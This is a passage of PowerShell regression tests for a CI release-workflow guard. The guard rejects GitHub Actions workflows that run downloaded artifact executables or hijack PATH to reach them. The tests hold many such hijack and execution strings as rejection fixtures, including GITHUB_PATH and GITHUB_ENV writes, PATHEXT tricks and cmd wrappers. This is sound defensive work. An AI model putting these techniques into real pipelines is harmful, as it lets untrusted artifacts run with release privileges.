            $runStep = @{ Name = $case.Name; Text = $case.Text; Shell = $case.Shell }
            if ($case.ContainsKey('WorkingDirectory')) { $runStep.WorkingDirectory = $case.WorkingDirectory }
            $fixtureArguments = @{ ScriptPath = $script; DownloadPath = $case.Path }
            if ($position -eq 'after artifact download') { $fixtureArguments.RunsAfterDownload = @($runStep) }
            else { $fixtureArguments.SecondInvocation = $true; $fixtureArguments.RunsBetweenInvocations = @($runStep) }
            $fixture = New-WorkflowGitScriptConsumerFixture @fixtureArguments
            $rejected = $false
            try { $null = Invoke-ReleaseWorkflowScriptSourceGuard -Workflows @(@{ Name = 'artifact-executable-provenance.yml'; Text = $fixture }) -RepositoryRoot $RepositoryRoot }
            catch { $rejected = $true }
            if (-not $rejected) { throw "Workflow contract accepted $($case.Name) $position; no artifact payload was executed." }
        }
    }

    $absoluteRepositoryRoot = ([IO.Path]::GetFullPath($RepositoryRoot)).Replace('\', '/').TrimEnd('/')
    $absoluteArtifactDirectory = $absoluteRepositoryRoot + '/artifacts'
    $absoluteArtifactHelper = $absoluteArtifactDirectory + '/rewrite.exe'
    foreach ($case in @(
        @{ Name = 'absolute output overlaps workspace root'; Path = $absoluteRepositoryRoot + '/./.' },
        @{ Name = 'absolute output overlaps tracked root scripts'; Path = $absoluteRepositoryRoot + '/src/../scripts' },
        @{ Name = 'absolute output overlaps nested tracked source'; Path = $absoluteRepositoryRoot + '/src/KeelMatrix.PackageSurface.Cli' }
    )) {
        $fixture = New-WorkflowGitScriptConsumerFixture -ScriptPath $script
        $fixture = $fixture.Replace('          path: artifacts', '          path: ' + $case.Path)
        $rejected = $false
        try { $null = Invoke-ReleaseWorkflowScriptSourceGuard -Workflows @(@{ Name = 'absolute-output-overlap.yml'; Text = $fixture }) -RepositoryRoot $RepositoryRoot }
        catch { $rejected = $true }
        if (-not $rejected) { throw "Workflow contract accepted $($case.Name); no artifact payload was executed." }
    }
    if ([IO.Path]::DirectorySeparatorChar -eq '\') {
        $rootRelativeWorkspaceOutput = New-WorkflowGitScriptConsumerFixture -ScriptPath $script -DownloadPath $absoluteRepositoryRoot.Substring(2)
        $rootRelativeOutputRejected = $false
        try { $null = Invoke-ReleaseWorkflowScriptSourceGuard -Workflows @(@{ Name = 'root-relative-absolute-output.yml'; Text = $rootRelativeWorkspaceOutput }) -RepositoryRoot $RepositoryRoot }
        catch { $rootRelativeOutputRejected = $true }
        if (-not $rootRelativeOutputRejected) { throw 'Workflow contract accepted a Windows root-relative artifact output that overlaps the workspace.' }
    }

    $absoluteInvocationShell = if ([IO.Path]::DirectorySeparatorChar -eq '\') { 'pwsh' } else { 'bash' }
    $absoluteInvocation = if ($absoluteInvocationShell -eq 'pwsh') { "& '$absoluteArtifactHelper' CHANGELOG.md" } else { "'$absoluteArtifactHelper' CHANGELOG.md" }
    foreach ($case in @(
        @{ Name = 'absolute workspace output with relative invocation'; Path = $absoluteArtifactDirectory + '/../artifacts'; Text = './artifacts/rewrite.exe CHANGELOG.md'; Shell = 'bash' },
        @{ Name = 'relative workspace output with absolute invocation'; Path = 'artifacts'; Text = $absoluteInvocation; Shell = $absoluteInvocationShell },
        @{ Name = 'relative workspace output with absolute dot-segment invocation'; Path = 'artifacts'; Text = "'$absoluteRepositoryRoot/src/../artifacts/rewrite.exe' CHANGELOG.md"; Shell = $absoluteInvocationShell }
    )) {
        $fixture = New-WorkflowGitScriptConsumerFixture -ScriptPath $script -DownloadPath $case.Path -RunsAfterDownload @(@{ Name = $case.Name; Text = $case.Text; Shell = $case.Shell })
        $rejected = $false
        try { $null = Invoke-ReleaseWorkflowScriptSourceGuard -Workflows @(@{ Name = 'absolute-artifact-executable.yml'; Text = $fixture }) -RepositoryRoot $RepositoryRoot }
        catch { $rejected = $true }
        if (-not $rejected) { throw "Workflow contract accepted $($case.Name); no artifact payload was executed." }
    }
    if ([IO.Path]::DirectorySeparatorChar -eq '\') {
        $rootRelativeArtifactHelper = '\' + $absoluteArtifactHelper.Substring(2)
        $rootRelativeInvocationFixture = New-WorkflowGitScriptConsumerFixture -ScriptPath $script -RunsAfterDownload @(
            @{ Name = 'Windows root-relative artifact invocation'; Text = "& '$rootRelativeArtifactHelper' CHANGELOG.md"; Shell = 'pwsh' }
        )
        $rootRelativeInvocationRejected = $false
        try { $null = Invoke-ReleaseWorkflowScriptSourceGuard -Workflows @(@{ Name = 'root-relative-absolute-invocation.yml'; Text = $rootRelativeInvocationFixture }) -RepositoryRoot $RepositoryRoot }
        catch { $rootRelativeInvocationRejected = $true }
        if (-not $rootRelativeInvocationRejected) { throw 'Workflow contract accepted a Windows root-relative executable path inside the artifact output.' }
    }

    foreach ($name in @('rewrite', 'rewrite.com', 'rewrite.exe', 'rewrite.bat', 'rewrite.cmd')) {
        $cmdFixture = New-WorkflowGitScriptConsumerFixture -ScriptPath $script -RunsAfterDownload @(
            @{ Name = "cmd current-directory lookup for $name"; Text = "$name CHANGELOG.md"; Shell = 'cmd'; WorkingDirectory = 'artifacts'; EnvText = '{ "PATHEXT": ".COM;.EXE;.BAT;.CMD" }' }
        )
        $rejected = $false
        try { $null = Invoke-ReleaseWorkflowScriptSourceGuard -Workflows @(@{ Name = 'cmd-artifact-current-directory.yml'; Text = $cmdFixture }) -RepositoryRoot $RepositoryRoot }
        catch { $rejected = $true }
        if (-not $rejected) { throw "Workflow contract accepted cmd current-directory lookup for '$name'; no artifact payload was executed." }
    }
    $customPathExtFixture = New-WorkflowGitScriptConsumerFixture -ScriptPath $script -RunsAfterDownload @(
        @{ Name = 'cmd custom PATHEXT lookup'; Text = 'rewrite.py CHANGELOG.md'; Shell = 'cmd.exe'; WorkingDirectory = 'artifacts'; EnvText = "{ PATHEXT: '.PY' }" }
    )
    $customPathExtRejected = $false
    try { $null = Invoke-ReleaseWorkflowScriptSourceGuard -Workflows @(@{ Name = 'cmd-custom-pathext.yml'; Text = $customPathExtFixture }) -RepositoryRoot $RepositoryRoot }
    catch { $customPathExtRejected = $true }
    if (-not $customPathExtRejected) { throw 'Workflow contract accepted a PATHEXT-resolved executable from the artifact working directory.' }

    $cmdAbsoluteWorkingDirectory = New-WorkflowGitScriptConsumerFixture -ScriptPath $script -RunsAfterDownload @(
        @{ Name = 'cmd absolute artifact working directory'; Text = 'rewrite.exe CHANGELOG.md'; Shell = 'cmd.exe'; WorkingDirectory = $absoluteArtifactDirectory }
    )
    $cmdAbsoluteWorkingDirectoryRejected = $false
    try { $null = Invoke-ReleaseWorkflowScriptSourceGuard -Workflows @(@{ Name = 'cmd-absolute-working-directory.yml'; Text = $cmdAbsoluteWorkingDirectory }) -RepositoryRoot $RepositoryRoot }
    catch { $cmdAbsoluteWorkingDirectoryRejected = $true }
    if (-not $cmdAbsoluteWorkingDirectoryRejected) { throw 'Workflow contract accepted cmd lookup from an absolute artifact working directory.' }

    foreach ($scope in @('workflow', 'job', 'step')) {
        $cmdNoDefaultRun = @{ Name = "cmd safe system lookup with $scope NoDefault setting"; Text = 'where.exe dotnet'; Shell = 'cmd'; WorkingDirectory = 'artifacts' }
        if ($scope -eq 'step') { $cmdNoDefaultRun.EnvText = "{ 'NODEFAULTCURRENTDIRECTORYINEXEPATH': '' }" }
        $cmdNoDefaultFixture = New-WorkflowGitScriptConsumerFixture -ScriptPath $script -RunsAfterDownload @(
            $cmdNoDefaultRun
        )
        if ($scope -eq 'workflow') {
            $cmdNoDefaultFixture = $cmdNoDefaultFixture.Replace('jobs:', ('env:' + [Environment]::NewLine + "  'NoDefaultCurrentDirectoryInExePath': '1'" + [Environment]::NewLine + 'jobs:'))
        }
        elseif ($scope -eq 'job') {
            $cmdNoDefaultFixture = $cmdNoDefaultFixture.Replace(('  future-consumer:' + [Environment]::NewLine + '    steps:'), ('  future-consumer:' + [Environment]::NewLine + '    env: { "noDefaultCurrentDirectoryInExePath": "1" }' + [Environment]::NewLine + '    steps:'))
        }
        $cmdNoDefaultResult = @(Invoke-ReleaseWorkflowScriptSourceGuard -Workflows @(@{ Name = 'cmd-no-default-current-directory.yml'; Text = $cmdNoDefaultFixture }) -RepositoryRoot $RepositoryRoot -RequiredConsumerNames @('cmd-no-default-current-directory.yml/future-consumer'))
        if ($cmdNoDefaultResult.Count -ne 1 -or $cmdNoDefaultResult[0].Scripts -notcontains $script) { throw "Workflow contract rejected trusted PATH lookup with the $scope NoDefaultCurrentDirectoryInExePath setting." }
    }

    $cmdBuiltinFixture = New-WorkflowGitScriptConsumerFixture -ScriptPath $script -RunsAfterDownload @(
        @{ Name = 'cmd built-in control'; Text = 'echo safe'; Shell = 'cmd'; WorkingDirectory = 'artifacts' }
    )
    $cmdBuiltinResult = @(Invoke-ReleaseWorkflowScriptSourceGuard -Workflows @(@{ Name = 'cmd-builtin-control.yml'; Text = $cmdBuiltinFixture }) -RepositoryRoot $RepositoryRoot -RequiredConsumerNames @('cmd-builtin-control.yml/future-consumer'))
    if ($cmdBuiltinResult.Count -ne 1 -or $cmdBuiltinResult[0].Scripts -notcontains $script) { throw 'A cmd built-in must remain safe with an artifact working directory.' }
    $artifactOutput = [pscustomobject]@{ Kind = 'workspace'; Path = 'artifacts'; RepositoryRoot = 'C:\workspace\repo' }
    $builtInName = -join ([char[]]@(112, 114, 111, 109, 112, 116))
    if (Test-WorkflowTokenTargetsArtifactOutput -Token $builtInName -ArtifactOutputPaths @($artifactOutput) -WorkingDirectory 'artifacts' -Shell 'cmd' -CheckCmdLookup) {
        throw 'A built-in command was treated as a downloaded executable.'
    }
    if (-not (Test-WorkflowTokenTargetsArtifactOutput -Token ($builtInName + '.exe') -ArtifactOutputPaths @($artifactOutput) -WorkingDirectory 'artifacts' -Shell 'cmd' -CheckCmdLookup)) {
        throw 'A path-resolved executable in the output directory was not rejected.'
    }

    foreach ($case in @(
        @{ Name = 'cmd call with echo prefix'; Text = '@call rewrite.exe CHANGELOG.md' },
        @{ Name = 'cmd call wrapper'; Text = 'call rewrite.exe CHANGELOG.md' },
        @{ Name = 'cmd start wrapper'; Text = 'start "" rewrite.exe CHANGELOG.md' },
        @{ Name = 'cmd for command substitution'; Text = "for /f %i in ('rewrite.exe') do echo %i" },
        @{ Name = 'cmd conditional execution'; Text = 'if exist rewrite.exe rewrite.exe CHANGELOG.md' }
    )) {
        $fixture = New-WorkflowGitScriptConsumerFixture -ScriptPath $script -RunsAfterDownload @(
            @{ Name = $case.Name; Text = $case.Text; Shell = 'cmd'; WorkingDirectory = 'artifacts' }
        )
        $rejected = $false
        try { $null = Invoke-ReleaseWorkflowScriptSourceGuard -Workflows @(@{ Name = 'cmd-nested-invocation.yml'; Text = $fixture }) -RepositoryRoot $RepositoryRoot }
        catch { $rejected = $true }
        if (-not $rejected) { throw "Workflow contract accepted $($case.Name) with an artifact working directory." }
    }

    foreach ($case in @(
        @{ Name = 'Bash working-directory change'; Text = 'cd artifacts && ./rewrite CHANGELOG.md'; Shell = 'bash' },
        @{ Name = 'PowerShell working-directory change'; Text = 'Set-Location artifacts; .\rewrite.exe CHANGELOG.md'; Shell = 'pwsh' },
        @{ Name = 'cmd working-directory change'; Text = '@cd /d artifacts & rewrite.exe CHANGELOG.md'; Shell = 'cmd' }
    )) {
        $fixture = New-WorkflowGitScriptConsumerFixture -ScriptPath $script -RunsAfterDownload @(
            @{ Name = $case.Name; Text = $case.Text; Shell = $case.Shell }
        )
        $rejected = $false
        try { $null = Invoke-ReleaseWorkflowScriptSourceGuard -Workflows @(@{ Name = 'artifact-working-directory-change.yml'; Text = $fixture }) -RepositoryRoot $RepositoryRoot }
        catch { $rejected = $true }
        if (-not $rejected) { throw "Workflow contract accepted $($case.Name) with downloaded executable output." }
    }

    $pathLookupCases = @(
        @{ Name = 'Bash PATH lookup of arbitrary artifact helper'; Text = 'export PATH="$GITHUB_WORKSPACE/artifacts:$PATH"; rewrite CHANGELOG.md'; Shell = 'bash' },
        @{ Name = 'inline PATH lookup through GNU gtimeout'; Text = 'PATH="$GITHUB_WORKSPACE/artifacts:$PATH" gtimeout -- 1 rewrite src/KeelMatrix.PackageSurface.Cli/README.md'; Shell = 'bash' },
        @{ Name = 'absolute artifact PATH lookup through GNU gtimeout'; Text = 'PATH="/tmp/release-helper:$PATH" gtimeout -- 1 rewrite CHANGELOG.md'; Shell = 'bash'; Path = '/tmp/release-helper' },
        @{ Name = 'env PATH lookup of arbitrary artifact helper'; Text = 'env PATH="$GITHUB_WORKSPACE/artifacts:$PATH" rewrite CHANGELOG.md'; Shell = 'bash' },
        @{ Name = 'unset inherited PATH before artifact command'; Text = 'unset PATH; rewrite CHANGELOG.md'; Shell = 'bash' },
        @{ Name = 'GITHUB_ENV PATH lookup of arbitrary artifact helper'; Text = 'echo "PATH=$GITHUB_WORKSPACE/artifacts:$PATH" >> "$GITHUB_ENV"; rewrite CHANGELOG.md'; Shell = 'bash' },
        @{ Name = 'PowerShell PATH lookup of arbitrary artifact helper'; Text = '$env:PATH = "$env:GITHUB_WORKSPACE\artifacts;$env:PATH"; rewrite.exe src/KeelMatrix.PackageSurface.Cli/README.md'; Shell = 'pwsh' },
        @{ Name = 'cmd quoted PATH assignment'; Text = '@set "PATH=%GITHUB_WORKSPACE%\artifacts;%PATH%" & rewrite.exe CHANGELOG.md'; Shell = 'cmd' },
        @{ Name = 'cmd PATH builtin mutation'; Text = '@path C:\workspace\repo\artifacts;%PATH%;rewrite.exe CHANGELOG.md'; Shell = 'cmd' }
    )
    foreach ($case in $pathLookupCases) {
        $downloadPath = if ($case.ContainsKey('Path')) { $case.Path } else { 'artifacts' }
        $fixture = New-WorkflowGitScriptConsumerFixture -ScriptPath $script -DownloadPath $downloadPath -RunsAfterDownload @(@{ Name = $case.Name; Text = $case.Text; Shell = $case.Shell })
        $rejected = $false
        try { $null = Invoke-ReleaseWorkflowScriptSourceGuard -Workflows @(@{ Name = 'artifact-path-lookup.yml'; Text = $fixture }) -RepositoryRoot $RepositoryRoot }
        catch { $rejected = $true }
        if (-not $rejected) { throw "Workflow contract accepted $($case.Name)." }
    }

    $persistentPathFixture = New-WorkflowGitScriptConsumerFixture -ScriptPath $script -RunsBeforeDownload @(
        @{ Name = 'Persist artifact directory on PATH'; Text = 'echo "$GITHUB_WORKSPACE/artifacts" >> "$GITHUB_PATH"'; Shell = 'bash' }
    ) -RunsAfterDownload @(
        @{ Name = 'Resolve a command after artifact download'; Text = 'rewrite CHANGELOG.md'; Shell = 'bash' }
    )
    $persistentPathRejected = $false
    try { $null = Invoke-ReleaseWorkflowScriptSourceGuard -Workflows @(@{ Name = 'artifact-persistent-path.yml'; Text = $persistentPathFixture }) -RepositoryRoot $RepositoryRoot }
    catch { $persistentPathRejected = $true }
    if (-not $persistentPathRejected) { throw 'Workflow contract accepted a persistent PATH addition that can resolve an artifact helper.' }

    foreach ($case in @(
        @{ Name = 'GITHUB_PATH before download'; Text = 'echo "$GITHUB_WORKSPACE/artifacts" >> "$GITHUB_PATH"'; Position = 'before-download' },
        @{ Name = 'GITHUB_ENV after download'; Text = 'echo "PATH=$GITHUB_WORKSPACE/artifacts:$PATH" >> "$GITHUB_ENV"'; Position = 'after-download' },
        @{ Name = 'legacy add-path between guarded invocations'; Text = 'echo ::add-path::$GITHUB_WORKSPACE/artifacts'; Position = 'between-invocations' }
    )) {
        $mutationStep = @{ Name = $case.Name; Text = $case.Text; Shell = 'bash' }
        if ($case.Position -eq 'before-download') {
            $fixture = New-WorkflowGitScriptConsumerFixture -ScriptPath $script -RunsBeforeDownload @($mutationStep)
        }
        elseif ($case.Position -eq 'after-download') {
            $fixture = New-WorkflowGitScriptConsumerFixture -ScriptPath $script -RunsAfterDownload @($mutationStep)
        }
        else {
            $fixture = New-WorkflowGitScriptConsumerFixture -ScriptPath $script -SecondInvocation -RunsBetweenInvocations @($mutationStep)
        }
        $rejected = $false
        try { $null = Invoke-ReleaseWorkflowScriptSourceGuard -Workflows @(@{ Name = 'persistent-path-state.yml'; Text = $fixture }) -RepositoryRoot $RepositoryRoot }
        catch { $rejected = $true }
        if (-not $rejected) { throw "Workflow contract failed to reject $($case.Name)." }
    }

    foreach ($position in @('before-download', 'after-download', 'between-invocations')) {
        $actionStep = @{ Name = "Unsupported path-mutating action $position"; Uses = 'actions/github-script@v7' }
        if ($position -eq 'before-download') {
            $fixture = New-WorkflowGitScriptConsumerFixture -ScriptPath $script -RunsBeforeDownload @($actionStep)
        }
        elseif ($position -eq 'after-download') {
            $fixture = New-WorkflowGitScriptConsumerFixture -ScriptPath $script -RunsAfterDownload @($actionStep)
        }
        else {
            $fixture = New-WorkflowGitScriptConsumerFixture -ScriptPath $script -SecondInvocation -RunsBetweenInvocations @($actionStep)
        }
        $rejected = $false
        try { $null = Invoke-ReleaseWorkflowScriptSourceGuard -Workflows @(@{ Name = 'unsupported-action-path-state.yml'; Text = $fixture }) -RepositoryRoot $RepositoryRoot }
        catch { $rejected = $true }
        if (-not $rejected) { throw "Workflow contract failed to reject an unsupported uses action $position guarded execution." }
    }

    $trustedSetupDotnet = New-WorkflowGitScriptConsumerFixture -ScriptPath $script -RunsBeforeDownload @(
        @{ Name = 'Set up trusted system dotnet'; Uses = 'actions/setup-dotnet@v4'; With = @{ 'dotnet-version' = '8.0.x' } }
    )
    $trustedSetupDotnetResult = @(Invoke-ReleaseWorkflowScriptSourceGuard -Workflows @(@{ Name = 'trusted-system-path-action.yml'; Text = $trustedSetupDotnet }) -RepositoryRoot $RepositoryRoot -RequiredConsumerNames @('trusted-system-path-action.yml/future-consumer'))
    if ($trustedSetupDotnetResult.Count -ne 1 -or $trustedSetupDotnetResult[0].Scripts -notcontains $script) {
        throw 'A supported setup-dotnet system PATH control must remain valid before artifact download.'
    }
    if (-not (Test-WorkflowRunAddsPersistentPath -Text 'core.addPath("$GITHUB_WORKSPACE/artifacts")')) {
        throw 'The toolkit addPath API must be recognized as persistent executable-path state.'
    }
    if (-not (Test-WorkflowRunAddsPersistentPath -Text 'core.exportVariable("PATH", "$GITHUB_WORKSPACE/artifacts:$PATH")')) {
        throw 'The toolkit exportVariable API must be recognized as persistent PATH state.'
    }

    foreach ($case in @(
        @{ Scope = 'workflow'; Style = 'block'; Key = 'path' },
        @{ Scope = 'workflow'; Style = 'flow'; Key = '"PaTh"' },
        @{ Scope = 'workflow'; Style = 'flow'; Key = '"\u0050ATH"' },
        @{ Scope = 'job'; Style = 'block'; Key = "'pAtH'" },
        @{ Scope = 'job'; Style = 'flow'; Key = 'PATH' },
        @{ Scope = 'step'; Style = 'block'; Key = 'Path' },
        @{ Scope = 'step'; Style = 'flow'; Key = "'PATH'" }
    )) {
        $pathEnvironmentFixture = New-WorkflowScriptConsumerFixture -ScriptPath $script
        $pathEnvironmentFixture = Add-WorkflowFixturePathEnvironment -Fixture $pathEnvironmentFixture -Scope $case.Scope -Style $case.Style -Key $case.Key
        $pathEnvironmentRejected = $false
        try { $null = Invoke-ReleaseWorkflowScriptSourceGuard -Workflows @(@{ Name = 'artifact-path-environment.yml'; Text = $pathEnvironmentFixture }) -RepositoryRoot $RepositoryRoot }
        catch { $pathEnvironmentRejected = $true }
        if (-not $pathEnvironmentRejected) { throw "Workflow contract accepted $($case.Style) PATH environment at $($case.Scope) scope with key $($case.Key)." }
    }
    $mergedPathEnvironmentFixture = New-WorkflowScriptConsumerFixture -ScriptPath $script
    $mergedPathEnvironmentFixture = $mergedPathEnvironmentFixture.Replace('jobs:', ('env: { <<: { Path: ''/workspace/artifacts'' } }' + [Environment]::NewLine + 'jobs:'))
    $mergedPathEnvironmentRejected = $false
    try { $null = Invoke-ReleaseWorkflowScriptSourceGuard -Workflows @(@{ Name = 'artifact-merged-path-environment.yml'; Text = $mergedPathEnvironmentFixture }) -RepositoryRoot $RepositoryRoot }
    catch { $mergedPathEnvironmentRejected = $true }
    if (-not $mergedPathEnvironmentRejected) { throw 'Workflow contract accepted an unsupported YAML merge that can define PATH.' }

    $actionPathEnvironmentFixture = New-WorkflowGitScriptConsumerFixture -ScriptPath $script -RunsBeforeDownload @(
        @{ Name = 'Supported action with step PATH override'; Uses = 'actions/setup-dotnet@v4'; EnvText = '{ "PaTh": "C:/workspace/artifacts" }' }
    )
    $actionPathEnvironmentRejected = $false
    try { $null = Invoke-ReleaseWorkflowScriptSourceGuard -Workflows @(@{ Name = 'artifact-action-path-environment.yml'; Text = $actionPathEnvironmentFixture }) -RepositoryRoot $RepositoryRoot }
    catch { $actionPathEnvironmentRejected = $true }
    if (-not $actionPathEnvironmentRejected) { throw 'Workflow contract accepted PATH from an action step environment.' }

    foreach ($case in @(
        @{ Name = 'default workspace-root artifact output'; Path = $null; Omit = $true },
        @{ Name = 'artifact output overlaps tracked scripts'; Path = 'scripts'; Omit = $false },
        @{ Name = 'artifact output overlaps nested tracked source'; Path = 'src/KeelMatrix.PackageSurface.Cli'; Omit = $false }
    )) {
        $fixtureArguments = @{ ScriptPath = $script }
        if ($case.Omit) { $fixtureArguments.OmitDownloadPath = $true }
        else { $fixtureArguments.DownloadPath = $case.Path }
        $fixture = New-WorkflowGitScriptConsumerFixture @fixtureArguments
        $rejected = $false
        try { $null = Invoke-ReleaseWorkflowScriptSourceGuard -Workflows @(@{ Name = 'artifact-output-overlaps-source.yml'; Text = $fixture }) -RepositoryRoot $RepositoryRoot }
        catch { $rejected = $true }
        if (-not $rejected) { throw "Workflow contract accepted $($case.Name), which can replace tracked source." }
    }

    $dynamicArtifactOutputFixture = New-WorkflowGitScriptConsumerFixture -ScriptPath $script -DownloadPath '~/release-helper'
    $dynamicArtifactOutputRejected = $false
    try { $null = Invoke-ReleaseWorkflowScriptSourceGuard -Workflows @(@{ Name = 'dynamic-artifact-output.yml'; Text = $dynamicArtifactOutputFixture }) -RepositoryRoot $RepositoryRoot }
    catch { $dynamicArtifactOutputRejected = $true }
    if (-not $dynamicArtifactOutputRejected) { throw 'Workflow contract accepted a tilde-expanded artifact output whose absolute location was unresolved.' }

    $absoluteDataOutputFixture = New-WorkflowGitScriptConsumerFixture -ScriptPath $script -DownloadPath '/tmp/release-artifacts'
    $absoluteDataOutputResult = @(Invoke-ReleaseWorkflowScriptSourceGuard -Workflows @(@{ Name = 'absolute-artifact-data-output.yml'; Text = $absoluteDataOutputFixture }) -RepositoryRoot $RepositoryRoot -RequiredConsumerNames @('absolute-artifact-data-output.yml/future-consumer'))
    if ($absoluteDataOutputResult.Count -ne 1 -or $absoluteDataOutputResult[0].Scripts -notcontains $script) {
        throw 'An absolute artifact output used only as data must preserve the pinned source proof.'
    }

    $trustedSystemWrapperBeforeDownload = New-WorkflowGitScriptConsumerFixture -ScriptPath $script -RunsBeforeDownload @(
        @{ Name = 'Use trusted system gtimeout before artifact download'; Text = 'gtimeout -- 1 printf payload'; Shell = 'bash' }
    )
    $trustedSystemWrapperResult = @(Invoke-ReleaseWorkflowScriptSourceGuard -Workflows @(@{ Name = 'trusted-system-wrapper-before-download.yml'; Text = $trustedSystemWrapperBeforeDownload }) -RepositoryRoot $RepositoryRoot -RequiredConsumerNames @('trusted-system-wrapper-before-download.yml/future-consumer'))
    if ($trustedSystemWrapperResult.Count -ne 1 -or $trustedSystemWrapperResult[0].Scripts -notcontains $script) {
        throw 'A trusted system wrapper before artifact download must not be treated as artifact-supplied.'
    }

    $trustedSystemWrapperAfterDownload = New-WorkflowGitScriptConsumerFixture -ScriptPath $script -RunsAfterDownload @(
        @{ Name = 'Use trusted system gtimeout after artifact download'; Text = 'gtimeout -- 1 printf payload'; Shell = 'bash' }
    )
    $trustedSystemWrapperAfterDownloadResult = @(Invoke-ReleaseWorkflowScriptSourceGuard -Workflows @(@{ Name = 'trusted-system-wrapper-after-download.yml'; Text = $trustedSystemWrapperAfterDownload }) -RepositoryRoot $RepositoryRoot -RequiredConsumerNames @('trusted-system-wrapper-after-download.yml/future-consumer'))
    if ($trustedSystemWrapperAfterDownloadResult.Count -ne 1 -or $trustedSystemWrapperAfterDownloadResult[0].Scripts -notcontains $script) {
        throw 'A trusted system wrapper with unchanged PATH must remain usable after artifact download.'
    }

    $artifactActionRestore = New-WorkflowGitScriptConsumerFixture -ScriptPath $script -RunsAfterDownload @(
        @{ Name = 'Record a downloaded artifact executable write'; Text = './artifacts/rewrite CHANGELOG.md'; Shell = 'bash' }
    )
    $checkoutStep = @(
        '      - name: Restore pinned source after artifact execution',
        '        uses: actions/checkout@v4',
        '        with:',
        '          ref: ${{ github.sha }}'
    ) -join [Environment]::NewLine
    $artifactActionRestore = $artifactActionRestore.Replace('      - name: Validate packages', $checkoutStep + [Environment]::NewLine + '      - name: Validate packages')
    $artifactActionRestoreResult = @(Invoke-ReleaseWorkflowScriptSourceGuard -Workflows @(@{ Name = 'artifact-executable-action-restore.yml'; Text = $artifactActionRestore }) -RepositoryRoot $RepositoryRoot -RequiredConsumerNames @('artifact-executable-action-restore.yml/future-consumer'))
    if ($artifactActionRestoreResult.Count -ne 1 -or $artifactActionRestoreResult[0].Scripts -notcontains $script) {
        throw 'A clean unconditional root checkout must restore tracked bytes after an artifact-supplied executable.'
    }

    $externalArtifactRestore = New-WorkflowGitScriptConsumerFixture -ScriptPath $script -DownloadPath '/tmp/release-helper'
    $externalInvocationAfterCheckout = @(
        '      - name: Restore pinned source after artifact download',
        '        uses: actions/checkout@v4',
        '        with:',
        '          ref: ${{ github.sha }}',
        '      - name: Invoke absolute artifact executable after source restore',
        '        shell: bash',
        '        run: /tmp/release-helper/rewrite CHANGELOG.md'
    ) -join [Environment]::NewLine
    $externalArtifactRestore = $externalArtifactRestore.Replace('      - name: Validate packages', $externalInvocationAfterCheckout + [Environment]::NewLine + '      - name: Validate packages')
    $externalArtifactRestoreRejected = $false
    try { $null = Invoke-ReleaseWorkflowScriptSourceGuard -Workflows @(@{ Name = 'external-artifact-executable-survives-checkout.yml'; Text = $externalArtifactRestore }) -RepositoryRoot $RepositoryRoot }
    catch { $externalArtifactRestoreRejected = $true }
    if (-not $externalArtifactRestoreRejected) {
        throw 'A root checkout must not clear an absolute artifact output or trust its executable afterward.'
    }

    if ($CurrentConsumers.Count -eq 0) { return }

    $multiJobLines = [Collections.Generic.List[string]]::new()
    $multiJobLines.Add('jobs:')
    foreach ($consumer in $CurrentConsumers) {
        $fixture = New-WorkflowScriptConsumerFixture -ScriptPaths $consumer.Scripts -JobName $consumer.Name
        $fixtureLines = @($fixture -split '\r?\n')
        $multiJobLines.AddRange([string[]]$fixtureLines[1..($fixtureLines.Count - 1)])
    }
    $requiredConsumerNames = @($CurrentConsumers | ForEach-Object { "$($_.Workflow)/$($_.Name)" })
    $enumerated = @(Invoke-ReleaseWorkflowScriptSourceGuard -Workflows @(@{ Name = 'release.yml'; Text = ($multiJobLines -join [Environment]::NewLine) }) -RepositoryRoot $RepositoryRoot -RequiredConsumerNames $requiredConsumerNames)
    if ($enumerated.Count -ne $CurrentConsumers.Count) { throw 'Regression coverage did not enumerate every current script-consuming job.' }
    foreach ($consumer in $CurrentConsumers) {
        $actual = @($enumerated | Where-Object { $_.Name -eq $consumer.Name -and $_.Workflow -eq $consumer.Workflow })
        if ($actual.Count -ne 1) { throw "Regression coverage omitted '$($consumer.Workflow)/$($consumer.Name)'." }
        foreach ($currentScript in $consumer.Scripts) {
            if ($actual[0].Scripts -notcontains $currentScript) { throw "Regression coverage omitted '$currentScript' from '$($consumer.Workflow)/$($consumer.Name)'." }
        }
    }
}

function Get-WorkflowIndent([string] $Line) {
    return ([regex]::Match($Line, '^[ \t]*')).Length
}

function Get-WorkflowJobSections([string] $WorkflowText) {
    $lines = @($WorkflowText -split "`r?`n")
    $jobsLineIndex = -1
    $jobsIndent = -1
    for ($index = 0; $index -lt $lines.Count; $index++) {
        $match = [regex]::Match([string]$lines[$index], '^(?<indent>[ \t]*)jobs:\s*(?:#.*)?$')
        if ($match.Success) {
            $jobsLineIndex = $index
            $jobsIndent = $match.Groups['indent'].Value.Length
            break
        }
    }
    if ($jobsLineIndex -lt 0) { throw 'Workflow has no jobs mapping.' }

    $jobIndent = -1
    $jobName = $null
    $jobLines = [Collections.Generic.List[string]]::new()
    $jobs = [Collections.Generic.List[object]]::new()
    for ($index = $jobsLineIndex + 1; $index -lt $lines.Count; $index++) {
        $line = [string]$lines[$index]
        if ([string]::IsNullOrWhiteSpace($line) -or $line.TrimStart().StartsWith('#', [StringComparison]::Ordinal)) { continue }
        $indent = Get-WorkflowIndent $line
        if ($indent -le $jobsIndent) { break }
        if ($jobIndent -lt 0) { $jobIndent = $indent }

        $jobMatch = [regex]::Match($line, '^[ \t]*(?<name>[A-Za-z0-9_-]+):\s*(?:#.*)?$')
        if ($indent -eq $jobIndent -and $jobMatch.Success) {
            if ($null -ne $jobName) {
                $jobs.Add([pscustomobject]@{ Name = $jobName; Indent = $jobIndent; Lines = $jobLines.ToArray() })
            }
            $jobName = $jobMatch.Groups['name'].Value
            $jobLines = [Collections.Generic.List[string]]::new()
            continue
        }

        if ($null -ne $jobName) { $jobLines.Add($line) }
    }
    if ($null -ne $jobName) {
        $jobs.Add([pscustomobject]@{ Name = $jobName; Indent = $jobIndent; Lines = $jobLines.ToArray() })
    }
    return $jobs.ToArray()
}

function Get-WorkflowSteps([string[]] $JobLines) {
    $stepsLineIndex = -1
    $stepsIndent = -1
    for ($index = 0; $index -lt $JobLines.Count; $index++) {
        $match = [regex]::Match([string]$JobLines[$index], '^(?<indent>[ \t]*)steps:\s*(?:#.*)?$')
        if ($match.Success) {
            $stepsLineIndex = $index
            $stepsIndent = $match.Groups['indent'].Value.Length
            break
        }
    }
    if ($stepsLineIndex -lt 0) { return @() }

    $stepIndent = -1
    $stepLines = [Collections.Generic.List[string]]::new()
    $steps = [Collections.Generic.List[object]]::new()
    for ($index = $stepsLineIndex + 1; $index -lt $JobLines.Count; $index++) {
        $line = [string]$JobLines[$index]
